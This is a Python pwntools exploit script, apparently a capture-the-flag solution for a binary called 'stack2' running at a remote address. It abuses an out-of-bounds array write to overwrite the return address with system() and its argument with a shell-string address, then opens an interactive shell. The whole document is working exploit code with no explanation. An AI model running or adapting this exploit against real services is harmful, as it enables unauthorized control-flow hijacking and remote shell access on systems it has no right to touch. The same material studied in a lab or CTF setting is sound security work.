from pwn import*
#p = process('./stack2')
p = remote('111.198.29.45',50512)
context.log_level = 'debug'
#gdb.attach(p)
elf = ELF('./stack2')
system_addr = 0x8048450
p.sendlineafter('How many numbers you have:','100')
cnt = 0
p.recvuntil('Give me your numbers')
while True:
	p.sendline('0')
	cnt = cnt + 1
	if cnt == 100:
		break
def modify(var,modify):
	p.sendlineafter('exit','3')
	p.sendlineafter('which number to change:',str(var))
	p.sendlineafter('new number:',str(modify))

modify(132,80)
modify(133,132)
modify(134,4)
modify(135,8)
log.success('Have Modify The Ret Address')
modify(140,0x87)
modify(141,0X89)
modify(142,0X04)
modify(143,0X08)
log.success('Have Modify The Argument')
p.sendlineafter('exit','5')
p.interactive()



